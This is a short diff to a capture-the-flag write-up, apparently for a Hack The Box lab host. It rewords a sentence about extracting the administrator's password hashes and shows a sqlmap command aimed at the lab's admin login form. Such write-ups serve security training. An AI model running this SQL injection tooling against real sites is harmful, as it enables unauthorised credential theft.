@@ -106,7 +106,7 @@ If everything is done correctly you will see a 302 redirect response which will 
 
 
 ## SQLmap
-Alternatively, SQLmap can be used to extract the password hashes of the administrator and cracking them. 
+Alternatively, SQLmap can be used to extract the password hashes of the administrator. Cracking them should be the easy part.
 
 ```console
 root@EdgeOfNight:~# sqlmap -u https://admin-portal.europacorp.htb/login.php --data "email=whatever&password=whatever" 
